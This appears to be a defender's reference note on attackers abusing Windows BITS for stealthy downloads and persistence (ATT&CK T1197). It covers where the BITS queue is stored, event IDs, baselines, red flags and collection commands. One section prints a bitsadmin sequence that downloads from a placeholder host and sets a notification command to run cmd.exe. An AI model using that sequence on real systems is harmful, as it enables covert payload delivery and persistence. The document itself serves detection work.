BITS is the service Windows Update uses to download patches without saturating a connection. It is throttled, resumable, survives reboots, retries on its own for months, and — the part that matters here — performs its network activity from a **service process rather than the malware's own**, so outbound connections are attributed to `svchost.exe` doing something entirely routine.

## Two abuses, one mechanism

**Download channel.** A BITS job fetches a payload gradually, blending into the same traffic pattern as legitimate Windows updates. Because BITS is designed to be resilient, the job retries across reboots and network outages without any attacker involvement.

**Persistence.** The `SetNotifyCmdLine` option specifies a command to run **when the job completes or errors**. That converts a download job into an execution trigger, and because BITS jobs have a long default lifetime — **90 days** by default before an inactive job is discarded — a job configured to fail and retry can keep firing its notification command for months.

```
bitsadmin /create backup
bitsadmin /addfile backup http://<host>/f.dat C:\Users\Public\f.dat
bitsadmin /SetNotifyCmdLine backup C:\Windows\System32\cmd.exe "cmd.exe /c ..."
bitsadmin /resume backup
```

The modern PowerShell equivalent is `Start-BitsTransfer`, which does not itself expose the notification-command behaviour — `bitsadmin` remains the tell for that variant.

## Where the jobs actually live

The BITS queue is a database on disk, not a registry key:

```
C:\ProgramData\Microsoft\Network\Downloader\qmgr.db          (Windows 10 1709+)
C:\ProgramData\Microsoft\Network\Downloader\qmgr0.dat        (older)
C:\ProgramData\Microsoft\Network\Downloader\qmgr1.dat        (older)
```

This matters for offline analysis: a triage that checks registry autoruns and scheduled tasks will not encounter a BITS job at all, because it lives in neither.

## Detection

`Microsoft-Windows-Bits-Client/Operational` is enabled by default and records job lifecycle:

| Event ID | Meaning |
|---|---|
| 3 | Job created (includes the job owner and name) |
| 4 | Job completed |
| 59 | Job started transferring |
| 60 | Job stopped |

Event ID 3 is the registration record, and its job **name** is often the fastest tell — attacker jobs frequently carry generic or imitative names like `update`, `system`, or a random string, against a baseline where legitimate BITS jobs come from identifiable software.

## Normal baseline

BITS jobs originate from Windows Update, Microsoft Store, Configuration Manager/Intune, and vendor updaters. They transfer from Microsoft or vendor domains. Job counts are low and jobs complete rather than lingering. `SetNotifyCmdLine` is essentially unused by legitimate software.

## Red flags

- **A BITS job with a notification command line set** — the clearest single indicator here.
- **A job transferring from a non-Microsoft, non-vendor host**, particularly a raw IP address.
- **A long-lived job that repeatedly fails and retries** rather than completing.
- **A job owned by a standard user account** rather than SYSTEM or a service account.
- **A local destination path under `%TEMP%`, `%APPDATA%`, or `C:\Users\Public`.**

## How to collect it

`bitsadmin /list /allusers /verbose` enumerates current jobs including notification command lines — the `/allusers` flag matters, since a job created by another user is invisible without it. `Get-BitsTransfer -AllUsers` is the PowerShell equivalent. Query Event ID 3 from `Microsoft-Windows-Bits-Client/Operational` for the historical record, including jobs already removed. Offline, the `qmgr.db` file can be parsed directly with community tooling.

## ATT&CK mapping

[BITS Jobs (T1197)](https://attack.mitre.org/techniques/T1197/), overlapping with [Ingress Tool Transfer (T1105)](https://attack.mitre.org/techniques/T1105/) for the download half.

## Sources

- MITRE ATT&CK — T1197
- [Microsoft Learn — Background Intelligent Transfer Service](https://learn.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal)
